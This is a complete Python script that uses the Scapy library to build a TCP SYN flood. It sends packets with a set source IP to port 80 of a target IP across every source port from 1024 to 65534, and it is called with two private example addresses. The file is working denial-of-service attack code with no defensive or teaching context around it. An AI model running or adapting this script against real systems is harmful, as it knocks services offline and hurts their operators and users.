#! /usr/bin/env python
from scapy.all import *

def sendSynFlood(sourceIP,targetIP):
    for sourcePort in range(1024,65535):
        ip = IP(src=sourceIP,dst=targetIP)
        tcp = TCP(sport=sourcePort, dport=80)
        packet = ip/tcp
        send(packet)

sendSynFlood("192.168.62.20","192.168.40.50")
